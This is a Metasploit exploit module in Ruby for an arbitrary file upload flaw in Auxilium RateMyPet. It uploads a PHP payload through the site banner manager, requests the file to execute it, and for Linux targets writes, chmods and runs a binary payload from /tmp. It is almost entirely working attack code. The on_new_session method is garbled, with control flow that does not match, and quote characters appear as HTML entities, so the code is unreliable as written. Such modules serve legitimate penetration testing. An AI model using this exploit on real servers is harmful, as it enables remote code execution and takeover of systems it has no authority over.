# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::EXE

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "Auxilium RateMyPet Arbitrary File Upload Vulnerability",
      &#039;Description&#039;    => %q{
          This module exploits a vulnerability found in Auxilium RateMyPet&#039;s. The site
        banner uploading feature can be abused to upload an arbitrary file to the web
        server, which is accessible in the &#039;banner&#039; directory, thus allowing remote code
        execution.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;DaOne&#039;,  #Vulnerability discovery
          &#039;sinn3r&#039;  #Metasploit
        ],
      &#039;References&#039;     =>
        [
          [&#039;OSVDB&#039;, &#039;85554&#039;],
          [&#039;EDB&#039;, &#039;21329&#039;]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039; => "\x00"
        },
      &#039;DefaultOptions&#039;  =>
        {
          &#039;ExitFunction&#039; => "none"
        },
      &#039;Platform&#039;       => [&#039;linux&#039;, &#039;php&#039;],
      &#039;Targets&#039;        =>
        [
        [ &#039;Generic (PHP Payload)&#039;, { &#039;Arch&#039; => ARCH_PHP, &#039;Platform&#039; => &#039;php&#039; }  ],
        [ &#039;Linux x86&#039;            , { &#039;Arch&#039; => ARCH_X86, &#039;Platform&#039; => &#039;linux&#039;} ]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Sep 14 2012",
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base directory to the application&#039;, &#039;/Auxiliumpetratepro/&#039;])
      ], self.class)
  end


  def check
    target_uri.path << &#039;/&#039; if target_uri.path[-1,1] != &#039;/&#039;
    base = File.dirname("#{target_uri.path}.")

    res = send_request_raw({&#039;uri&#039;=>"#{base}/admin/sitebanners/upload_banners.php"})
    if res and res.body =~ /\<title\>Pet Rate Admin \- Banner Manager\<\/title\>/
      return Exploit::CheckCode::Appears
    else
      return Exploit::CheckCode::Safe
    end
  end


  def get_write_exec_payload(fname, data)
    p = Rex::Text.encode_base64(generate_payload_exe)
    php = %Q|
    <?php
    $f = fopen("#{fname}", "wb");
    fwrite($f, base64_decode("#{p}"));
    fclose($f);
    exec("chmod 777 #{fname}");
    exec("#{fname}");
    ?>
    |
    php = php.gsub(/^\t\t/, &#039;&#039;).gsub(/\n/, &#039; &#039;)
    return php
  end


  def on_new_session(cli)
      cli.core.use("stdapi") if not cli.ext.aliases.include?("stdapi")
    end

    @clean_files.each do |f|
      print_status("#{@peer} - Removing: #{f}")
      begin
          cli.fs.file.rm(f)
        else
          cli.shell_command_token("rm #{f}")
        end
      rescue ::Exception => e
        print_error("#{@peer} - Unable to remove #{f}: #{e.message}")
      end
    end
  end


  def upload_exec(base, php_fname, p)
    data = Rex::MIME::Message.new
    data.add_part(&#039;http://&#039;, nil, nil, "form-data; name=\"burl\"")
    data.add_part(&#039;&#039;, nil, nil, "form-data; name=\"alt\"")
    data.add_part(p, &#039;text/plain&#039;, nil, "form-data; name=\"userfile\"; filename=\"#{php_fname}\"")
    data.add_part(&#039; Upload&#039;, nil, nil, "form-data; name=\"submitok\"")

    post_data = data.to_s
    post_data = post_data.gsub(/^\r\n\-\-\_Part\_/, &#039;--_Part_&#039;)

    print_status("#{@peer} - Uploading payload (#{p.length.to_s} bytes)...")
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => "#{base}/admin/sitebanners/upload_banners.php",
      &#039;ctype&#039;  => "multipart/form-data; boundary=#{data.bound}",
      &#039;data&#039;   => post_data,
    })

    if not res
      print_error("#{@peer} - No response from host")
      return
    end

    print_status("#{@peer} - Requesting &#039;#{php_fname}&#039;...")
    res = send_request_raw({&#039;uri&#039;=>"#{base}/banners/#{php_fname}"})
    if res and res.code == 404
      print_error("#{@peer} - Upload unsuccessful: #{res.code.to_s}")
      return
    end

    handler
  end


  def exploit
    @peer = "#{rhost}:#{rport}"

    target_uri.path << &#039;/&#039; if target_uri.path[-1,1] != &#039;/&#039;
    base = File.dirname("#{target_uri.path}.")

    php_fname =  "#{Rex::Text.rand_text_alpha(5)}.php"
    @clean_files = [php_fname]

    case target[&#039;Platform&#039;]
    when &#039;php&#039;
      p = "<?php #{payload.encoded} ?>"
    when &#039;linux&#039;
      bin_name = "#{Rex::Text.rand_text_alpha(5)}.bin"
      @clean_files << bin_name
      bin = generate_payload_exe
      p = get_write_exec_payload("/tmp/#{bin_name}", bin)
    end

    upload_exec(base, php_fname, p)
  end
end



